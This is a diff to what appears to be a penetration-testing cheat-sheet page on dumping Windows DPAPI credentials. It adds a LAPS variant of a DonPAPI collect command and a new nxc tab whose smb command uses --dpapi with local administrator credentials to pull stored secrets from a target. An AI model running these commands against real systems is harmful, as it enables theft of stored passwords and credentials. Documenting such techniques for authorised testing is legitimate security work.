@@ -8,6 +8,7 @@ tags: ["Credential Dumping", "Mimikatz", "DPAPI", "Windows", "Password", "Donpap
 
 {{< tab set1 tab1  >}}pypykatz{{< /tab >}}
 {{< tab set1 tab2 >}}DonPAPI{{< /tab >}}
+{{< tab set1 tab3 >}}nxc{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 #### 1. Info Gathering
@@ -75,7 +76,20 @@ DonPAPI collect -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -t <TARGET>
 DonPAPI collect -d <DOMAIN> -u '<USER>' -H <HASH> -t <TARGET>
 ```
 
+```console
+# LAPS
+DonPAPI collect -u '<USER>' -p '<PASSWORD>' -t <TARGET>
+```
+
 <small>*Ref: [DonPAPI](https://github.com/login-securite/DonPAPI)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab3 >}}
+
+```console
+# LAPS
+nxc smb <TARGET_DOMAIN> -u administrator -p '<PASSWORD>' --dpapi --local-auth
+```
 
 {{< /tabcontent >}}
 
